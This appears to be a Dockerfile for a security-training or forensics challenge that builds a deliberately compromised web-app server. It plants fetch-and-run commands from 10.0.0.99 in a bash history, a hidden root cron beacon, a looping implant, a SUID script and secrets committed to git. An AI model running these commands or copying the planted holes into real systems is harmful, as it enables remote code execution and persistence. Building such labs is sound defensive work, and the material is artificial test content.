FROM ubuntu:22.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update -y && apt-get install -y openssh-server sudo curl wget git nodejs npm python3 python3-pip \
    bc net-tools procps cron vim nano file binutils xxd rsync dos2unix && rm -rf /var/lib/apt/lists/*
RUN mkdir /var/run/sshd && echo 'PermitRootLogin no' >> /etc/ssh/sshd_config && echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config
RUN useradd -m -s /bin/bash spider && echo 'spider:webslinger2026' | chpasswd && usermod -aG sudo spider
RUN useradd -m -s /bin/bash karthik && echo 'karthik:x' | chpasswd
RUN useradd -m -s /bin/bash priya && echo 'priya:x' | chpasswd
RUN printf 'curl http://10.0.0.99/implant.sh | bash\nchmod 777 /var/www/spider-app\nbase64 -d /var/www/spider-app/scripts/cleanup.sh | bash\necho "*/5 * * * * root curl -s http://10.0.0.99/collect | bash" > /etc/cron.d/.spider-diag\n' > /home/karthik/.bash_history && \
    chown karthik:karthik /home/karthik/.bash_history && chmod 600 /home/karthik/.bash_history
RUN mkdir -p /var/www/spider-app/scripts && mkdir -p /var/www/spider-app/config && mkdir -p /var/www/spider-app/src && mkdir -p /var/www/spider-app/logs &&\
    mkdir -p /var/log/spider && mkdir -p /backups/spider

COPY Task1/scripts/deploy.sh /var/www/spider-app/scripts/deploy.sh
COPY Task1/scripts/backup.sh /var/www/spider-app/scripts/backup.sh
COPY Task1/scripts/cleanup.sh /var/www/spider-app/scripts/cleanup.sh
COPY Task1/scripts/init.sh /var/www/spider-app/scripts/init.sh
COPY Task1/scripts/monitor.sh /var/www/spider-app/scripts/monitor.sh
COPY Task1/config/.env /var/www/spider-app/config/.env
COPY Task1/config/.env.example /var/www/spider-app/config/.env.example
COPY Task1/config/.secrets /var/www/spider-app/config/.secrets
COPY Task1/config/app.conf /var/www/spider-app/config/app.conf
COPY Task1/src/server.js /var/www/spider-app/src/server.js
COPY Task1/src/db.js /var/www/spider-app/src/db.js
COPY Task1/src/utils.py /var/www/spider-app/src/utils.py
COPY Task1/root/.bootstrap /var/www/spider-app/.bootstrap
COPY Task1/root/.gitignore /var/www/spider-app/.gitignore
COPY Task1/root/README.md /var/www/spider-app/README.md

RUN find /var/www/spider-app -type f -exec dos2unix {} \; 2>/dev/null || true
RUN cp /bin/ls /var/www/spider-app/scripts/healthcheck.sh
RUN chmod 755 /var/www/spider-app/scripts/deploy.sh && chmod 755 /var/www/spider-app/scripts/init.sh && chmod 755 /var/www/spider-app/scripts/monitor.sh  && \
    chmod 755 /var/www/spider-app/scripts/healthcheck.sh
RUN chmod 757 /var/www/spider-app/scripts/backup.sh && chmod 757 /var/www/spider-app/config/.env
RUN git config --global --add safe.directory /var/www/spider-app && git config --global init.defaultBranch main && cd /var/www/spider-app && \
    git init && git config user.email "priya@spider-internal.dev" && git config user.name "Priya" && \
    git add README.md src/ config/app.conf && git add -f .gitignore && git commit -m "initial commit - app setup" && \
    git config user.email "karthik@spider-internal.dev" && git config user.name "Karthik" && git add scripts/cleanup.sh scripts/monitor.sh && \
    git add scripts/backup.sh scripts/deploy.sh && git add scripts/init.sh scripts/monitor.sh && git add -f config/.secrets && \
    git add -f .bootstrap && git commit -m "added diagnostics and monitoring [hotfix dec-12]" && git config user.email "priya@spider-internal.dev" && \
    git config user.name "Priya" && git add -f config/.env && git add -f .gitignore && git commit -m "updated gitignore - excluding build artifacts"
RUN chown -R spider:spider /var/www/spider-app && chown spider:spider /var/log/spider
RUN chmod 4755 /var/www/spider-app/scripts/cleanup.sh
RUN printf '# spider diagnostics - do not remove\n*/5 * * * * root curl -s "http://10.0.0.99:8080/collect?host=$(hostname)" >> /tmp/.spider-beacon.log 2>&1\n' \
    > /etc/cron.d/.spider-diag && chmod 644 /etc/cron.d/.spider-diag
RUN mkdir -p /tmp/.spider && printf '#!/bin/bash\nwhile true; do\n  curl -s http://10.0.0.99:8080/beacon\n  sleep 300\ndone\n' \
    > /tmp/.spider/.implant && chmod +x /tmp/.spider/.implant
RUN echo "== directory ==" && ls -la /var/www/spider-app/ && echo "== scripts ==" && ls -la /var/www/spider-app/scripts/ && \
    echo "== world-writable ==" && find /var/www/spider-app -perm -o+w -ls && echo "== SUID ==" && find /var/www/spider-app -perm /4000 -ls && \
    echo "== git log ==" && git -C /var/www/spider-app log --oneline --format="%h %ae %s"
COPY motd.txt /etc/motd
RUN echo '' >> /home/spider/.bashrc && echo 'cat /etc/motd' >> /home/spider/.bashrc && echo 'cd /var/www/spider-app' >> /home/spider/.bashrc
EXPOSE 22

CMD ["sh", "-c", "service cron start && /usr/sbin/sshd -D"]